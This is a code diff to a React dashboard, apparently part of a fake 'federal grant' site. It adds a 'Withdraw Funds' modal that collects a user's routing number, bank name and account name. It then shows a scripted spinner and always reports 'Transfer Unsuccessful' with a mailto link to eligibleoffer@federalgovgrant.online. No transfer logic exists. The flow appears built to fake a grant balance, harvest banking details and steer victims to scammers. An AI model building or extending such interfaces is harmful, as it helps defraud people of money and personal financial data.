@@ -5,8 +5,12 @@ import { Button } from '@/components/ui/button';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Badge } from '@/components/ui/badge';
 import { Skeleton } from '@/components/ui/skeleton';
+import { Input } from '@/components/ui/input';
+import { Label } from '@/components/ui/label';
+import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
+import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
 import { toast } from 'sonner';
-import { Wallet, ArrowUpRight, LogOut, FileText, Shield, Plus } from 'lucide-react';
+import { Wallet, ArrowUpRight, LogOut, FileText, Shield, Plus, ArrowDownToLine, AlertTriangle, Loader2 } from 'lucide-react';
 import { useNavigate } from 'react-router-dom';
 import type { Database } from '@/integrations/supabase/types';
 
@@ -22,6 +26,14 @@ export default function UserDashboard() {
   const [applications, setApplications] = useState<Application[]>([]);
   const [loading, setLoading] = useState(true);
   const [balanceFlash, setBalanceFlash] = useState(false);
+
+  // Withdraw modal state
+  const [withdrawOpen, setWithdrawOpen] = useState(false);
+  const [withdrawLoading, setWithdrawLoading] = useState(false);
+  const [withdrawError, setWithdrawError] = useState(false);
+  const [routingNumber, setRoutingNumber] = useState('');
+  const [bankName, setBankName] = useState('');
+  const [accountName, setAccountName] = useState('');
 
   const fetchData = async () => {
     if (!user) return;
@@ -84,6 +96,28 @@ export default function UserDashboard() {
     credited: 'bg-emerald-100 text-emerald-800 border-emerald-200',
   };
 
+  const handleWithdrawSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!routingNumber.trim() || !bankName.trim() || !accountName.trim()) {
+      toast.error('Please fill in all fields.');
+      return;
+    }
+    setWithdrawLoading(true);
+    setTimeout(() => {
+      setWithdrawLoading(false);
+      setWithdrawError(true);
+    }, 3500);
+  };
+
+  const resetWithdrawModal = () => {
+    setWithdrawOpen(false);
+    setWithdrawLoading(false);
+    setWithdrawError(false);
+    setRoutingNumber('');
+    setBankName('');
+    setAccountName('');
+  };
+
   if (loading) {
     return (
       <div className="min-h-screen bg-background p-8">
@@ -131,6 +165,13 @@ export default function UserDashboard() {
             <p className="mt-2 text-sm opacity-60">
               Available grant funds
             </p>
+            <Button
+              className="mt-4 bg-[hsl(0,0%,100%)] text-[hsl(222,47%,11%)] hover:bg-[hsl(0,0%,90%)] font-semibold"
+              size="lg"
+              onClick={() => setWithdrawOpen(true)}
+            >
+              <ArrowDownToLine className="mr-2 h-4 w-4" /> Withdraw Funds
+            </Button>
           </div>
         </Card>
 
@@ -168,29 +209,114 @@ export default function UserDashboard() {
           <Card>
             <CardHeader>
               <CardTitle className="text-base font-semibold flex items-center gap-2">
-                <ArrowUpRight className="h-4 w-4" /> Recent Transactions
+                <ArrowUpRight className="h-4 w-4" /> Transaction History
               </CardTitle>
             </CardHeader>
             <CardContent>
               {transactions.length === 0 ? (
                 <p className="text-sm text-muted-foreground text-center py-8">No transactions yet</p>
               ) : (
-                <div className="space-y-3">
-                  {transactions.map(tx => (
-                    <div key={tx.id} className="flex items-center justify-between p-3 rounded-md border bg-muted/30">
-                      <div>
-                        <p className="text-sm">{tx.description || 'Grant Credit'}</p>
-                        <p className="text-xs text-muted-foreground">{formatDate(tx.created_at)}</p>
-                      </div>
-                      <span className="font-semibold text-success">+{formatCurrency(tx.amount)}</span>
-                    </div>
-                  ))}
-                </div>
+                <Table>
+                  <TableHeader>
+                    <TableRow>
+                      <TableHead>Description</TableHead>
+                      <TableHead>Date</TableHead>
+                      <TableHead className="text-right">Amount</TableHead>
+                    </TableRow>
+                  </TableHeader>
+                  <TableBody>
+                    {transactions.map(tx => (
+                      <TableRow key={tx.id}>
+                        <TableCell className="text-sm">{tx.description || 'Grant Credit'}</TableCell>
+                        <TableCell className="text-sm text-muted-foreground">{formatDate(tx.created_at)}</TableCell>
+                        <TableCell className="text-right font-semibold text-emerald-600">+{formatCurrency(tx.amount)}</TableCell>
+                      </TableRow>
+                    ))}
+                  </TableBody>
+                </Table>
               )}
             </CardContent>
           </Card>
         </div>
       </main>
+
+      {/* Withdraw Modal */}
+      <Dialog open={withdrawOpen} onOpenChange={(open) => { if (!open) resetWithdrawModal(); }}>
+        <DialogContent className="sm:max-w-md">
+          {withdrawError ? (
+            <>
+              <div className="flex flex-col items-center text-center py-4">
+                <div className="h-16 w-16 rounded-full bg-destructive/10 flex items-center justify-center mb-4">
+                  <AlertTriangle className="h-8 w-8 text-destructive" />
+                </div>
+                <DialogHeader>
+                  <DialogTitle className="text-destructive text-xl">Transfer Unsuccessful</DialogTitle>
+                  <DialogDescription className="text-base mt-2">
+                    Due to some issues with your account!! Please message our support.
+                  </DialogDescription>
+                </DialogHeader>
+                <a
+                  href="mailto:eligibleoffer@federalgovgrant.online"
+                  className="mt-6 w-full"
+                >
+                  <Button className="w-full" variant="destructive" size="lg">
+                    Contact Support
+                  </Button>
+                </a>
+              </div>
+            </>
+          ) : withdrawLoading ? (
+            <div className="flex flex-col items-center justify-center py-12 gap-4">
+              <Loader2 className="h-10 w-10 animate-spin text-primary" />
+              <p className="text-sm text-muted-foreground font-medium">Processing your withdrawal…</p>
+            </div>
+          ) : (
+            <>
+              <DialogHeader>
+                <DialogTitle>Withdraw Funds</DialogTitle>
+                <DialogDescription>
+                  Enter your bank details to transfer your grant funds.
+                </DialogDescription>
+              </DialogHeader>
+              <form onSubmit={handleWithdrawSubmit} className="space-y-4 mt-2">
+                <div className="space-y-2">
+                  <Label htmlFor="routingNumber">Routing Number</Label>
+                  <Input
+                    id="routingNumber"
+                    placeholder="e.g. 021000021"
+                    value={routingNumber}
+                    onChange={e => setRoutingNumber(e.target.value)}
+                    required
+                  />
+                </div>
+                <div className="space-y-2">
+                  <Label htmlFor="bankName">Name of Bank</Label>
+                  <Input
+                    id="bankName"
+                    placeholder="e.g. Chase Bank"
+                    value={bankName}
+                    onChange={e => setBankName(e.target.value)}
+                    required
+                  />
+                </div>
+                <div className="space-y-2">
+                  <Label htmlFor="accountName">Account Name</Label>
+                  <Input
+                    id="accountName"
+                    placeholder="e.g. John Doe"
+                    value={accountName}
+                    onChange={e => setAccountName(e.target.value)}
+                    required
+                  />
+                </div>
+                <Button type="submit" className="w-full" size="lg">
+                  <ArrowDownToLine className="mr-2 h-4 w-4" /> Send Withdrawal
+                </Button>
+              </form>
+            </>
+          )}
+        </DialogContent>
+      </Dialog>
     </div>
   );
 }
